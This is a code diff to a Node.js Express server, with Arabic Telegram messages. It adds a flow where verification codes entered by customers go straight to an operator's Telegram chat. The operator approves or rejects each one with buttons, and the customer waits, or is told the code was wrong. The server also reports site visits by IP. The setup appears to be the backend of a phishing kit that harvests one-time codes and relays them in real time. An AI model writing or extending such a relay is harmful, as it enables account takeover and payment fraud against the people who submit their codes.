@@ -15,6 +15,7 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const PORT = process.env.PORT || 3000;
 
 const notifiedVisitIPs = new Set();
+const orderStatuses = new Map();
 let exchangeRate = parseInt(process.env.EXCHANGE_RATE || "1320", 10);
 let orderCounter = Math.floor(1000 + Math.random() * 8999);
 
@@ -48,6 +49,12 @@ function generateOrderId() {
 
 app.get("/api/config/rate", (_req, res) => {
   res.json({ rate: exchangeRate, ratePerHundred: exchangeRate * 100 });
+});
+
+app.get("/api/order/status/:orderId", (req, res) => {
+  const orderId = req.params.orderId;
+  const status = orderStatuses.get(orderId) || "pending";
+  res.json({ orderId, status });
 });
 
 app.post("/api/telegram/notify-visit", async (req, res) => {
@@ -96,12 +103,20 @@ app.post("/api/telegram/submit-order", async (req, res) => {
 app.post("/api/telegram/submit-code", async (req, res) => {
   try {
     const b = req.body;
+    orderStatuses.set(b.orderId, "pending");
     const msg =
-      `✅ <b>تم إدخال كود التحقق</b>\n\n` +
+      `🔑 <b>تم إدخال كود التحقق</b>\n\n` +
       `📋 <b>رقم الطلب:</b> ${b.orderId}\n` +
-      `🔑 <b>كود التحقق:</b> ${b.code}\n\n` +
-      `✅ الزبون أدخل الكود بنجاح`;
-    const sent = await sendTelegramMessage(msg);
+      `🔐 <b>كود التحقق:</b> ${b.code}\n\n` +
+      `⏳ الزبون ينتظر قرارك...`;
+    const sent = await sendTelegramMessage(msg, {
+      inline_keyboard: [
+        [
+          { text: "✅ موافقة", callback_data: `approve_${b.orderId}` },
+          { text: "❌ رفض", callback_data: `reject_${b.orderId}` },
+        ],
+      ],
+    });
     res.json({ success: sent, message: sent ? "تم" : "فشل" });
   } catch { res.status(400).json({ success: false, message: "خطأ" }); }
 });
@@ -146,6 +161,28 @@ async function pollTelegramUpdates() {
       if (update.callback_query) {
         const cb = update.callback_query;
         if (cb.message?.chat?.id?.toString() !== CHAT_ID) continue;
+
+        if (cb.data?.startsWith("approve_")) {
+          const oid = cb.data.replace("approve_", "");
+          orderStatuses.set(oid, "approved");
+          await answerCallbackQuery(cb.id, "تمت الموافقة ✅");
+          await sendTelegramMessage(
+            `✅ <b>تمت الموافقة على الطلب ${oid}</b>\n\n` +
+            `تم إبلاغ الزبون بنجاح العملية.`
+          );
+          continue;
+        }
+
+        if (cb.data?.startsWith("reject_")) {
+          const oid = cb.data.replace("reject_", "");
+          orderStatuses.set(oid, "rejected");
+          await answerCallbackQuery(cb.id, "تم الرفض ❌");
+          await sendTelegramMessage(
+            `❌ <b>تم رفض الطلب ${oid}</b>\n\n` +
+            `تم إبلاغ الزبون بأن الكود غلط.`
+          );
+          continue;
+        }
 
         if (cb.data === "change_rate") {
           awaitingRateInput = true;
